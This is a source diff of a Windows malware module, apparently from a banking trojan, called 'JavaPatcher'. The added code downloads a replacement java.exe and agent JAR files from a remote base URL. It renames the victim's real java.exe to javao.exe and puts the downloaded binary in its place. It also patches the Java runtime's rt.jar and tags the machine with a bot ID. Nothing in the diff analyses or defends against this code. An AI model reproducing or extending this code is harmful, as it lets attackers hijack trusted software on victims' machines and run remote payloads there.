@@ -179,7 +179,7 @@ static bool UID_To_File(char* BotUid)
 	return false;
 }
 
-static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* jarExePath, char* libPath)
+static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* jarExePath, char* libPath )
 {
 	DBG( "JavaPatcher", "Unpacking rt_add.jar" );
 	if( !UnpackToDir( rtAddPath, tmpRtPath, jarExePath ) )
@@ -360,7 +360,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	return res;
 }
 
-static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* jarExeFilePath )
+static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* jarExeFilePath, char* javaExe )
 {
 	FILE_CRC32* filesCrc32 = LoadCorrectCRC32(baseUrl);
 
@@ -434,10 +434,16 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
 
+	crcName = addUrl = "java.exe";
+	m_lstrcpy( javaExe, Path );
+	pPathAppendA( javaExe, addUrl );
+	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExe, crcName ) )
+		return false;
+
 	//загрузка в папку ALLUSERSPROFILE
 	GetAllUsersProfile( Path, sizeof(Path) );
 
-	const char* miscFiles[] = { "Agent.jar", "jni.dll", "client2015.jar", 0 };
+	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
@@ -465,7 +471,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	return true;
 }
 
- static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch )
+ static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe )
 {
 	MemPtr<MAX_PATH> tmpRtPath;
 	pGetTempPathA( tmpRtPath.size(), (char*) tmpRtPath );
@@ -479,7 +485,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, jarExeFilePath;
 
 	bool res = false;
-	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, jarExeFilePath ) )
+	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, jarExeFilePath, javaExe ) )
 	{
 		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, jarExeFilePath, libPatch ) )
 			res = true;
@@ -805,7 +811,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 		return TRUE;
 
 	MemPtr<513> user;
-	MemPtr<MAX_PATH> path;
+	MemPtr<MAX_PATH> path, javaExe;
 	char botUid[100];
 	GenerateUid(botUid);
 
@@ -828,7 +834,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	{
 		char *srcFile, *dstFile;
 		*path.str() = 0;
-		if( PatchRtJar( user, javaUrl, path ) )
+		if( PatchRtJar( user, javaUrl, path, javaExe ) )
 		{
 			UID_To_File(botUid);
 
@@ -874,6 +880,24 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
 				res = FALSE;		
 			}
+			//Подменяем яву
+			MemPtr<MAX_PATH> srcJava, dstJava;
+			m_lstrcpy( srcJava, javaHome );
+			pPathAppendA( srcJava.str(), "bin" );
+			m_lstrcpy( dstJava, srcJava );
+			pPathAppendA( srcJava.str(), "java.exe" );
+			pPathAppendA( dstJava.str(), "javao.exe" );
+			if( pMoveFileA( srcJava.str(), dstJava.str() ) )
+			{
+				DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
+				if( pCopyFileA( javaExe.str(), srcJava.str() ) )
+				{
+					DBG( "JavaPatcher", "copy OK %s -> %s", javaExe.str(), srcJava.str() );
+				}
+			}
+			else
+				DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			pDeleteFileA(javaExe.str());
 		};
 
 	}
